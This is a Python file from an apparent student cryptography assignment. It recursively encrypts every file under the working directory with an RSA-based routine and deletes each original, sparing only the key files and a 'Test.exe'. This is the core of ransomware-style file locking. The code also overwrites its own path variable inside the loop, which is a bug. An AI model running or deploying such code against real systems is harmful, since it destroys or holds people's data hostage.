# Eleazar Gomez
# Dion Woo
#
# RSA File Step 3: Encrypt

from os import getcwd, walk, sep, remove

from checkKeys import *
from MyRSAEncrypt import *
from CONSTANTS import *

# void = Encrypt()
#
# You can use the OS package to retrieve the current working directory.
# Then you can get a list of all files in this directory.
# For each file, encrypt them using MyRSAEncrypt from your new
# FileEncryptMAC module. Do this in a loop for all files (make sure you do
# not encrypt the RSA Private Key file). For every file that is encrypted,
# store the encrypted file as a JSON file. The attributes you have for each
# file are 'RSACipher', 'C', 'IV', 'tag' and 'ext'. The values are from
# MyRSAEncrypt method. Once the JSON file is written (use json.dump() with
# file.write() methods) into a JSON file then you can remove the plaintext
# file (use os.remove() method). Note that you need to encode/decode your
# data before writing them into a JSON file.

# Make sure then you can traverse thru all files within all sub-directories
# of a current working directory.  Encrypt all such files (either recursive
# execution or os.walk as an example).

def Encrypt():
    # Check keys
    checkKeys()

    # Get cwd
    cwd = getcwd()

    # List to store data needed for decryption (pathToFile and filenams)
    fileInfo = []

    # Traverse root directory, and list directories as dirs and files as files
    for root, dirs, files in walk("."):
        # Retrive the path of directories to the file
        path = root.split(sep)
        pathToFile = cwd

        if len(path) > 1:
            for i in range(1, len(path)):
                pathToFile = pathToFile + "\\" + path[i]
                
        # Loop through all files
        for file in files:
            # Retrieve the full filepath
            filepath = pathToFile + "\\" + file

            # Exclude private key, public key, and executable from encryption
            if filepath != cwd + "\\rsa_private_key.pem" and filepath != cwd + "\\rsa_public_key.pem" and filepath != cwd + "\\Test.exe":
                # Encrypt
                pathToFile, filename = MyRSAEncrypt(filepath, RSA_PUBLIC_KEY_FILEPATH)

                # Store file info
                fileInfo.append([pathToFile, filename])

                # Remove the file
                remove(pathToFile + "\\" + file)

    # Return the list
    return fileInfo
    
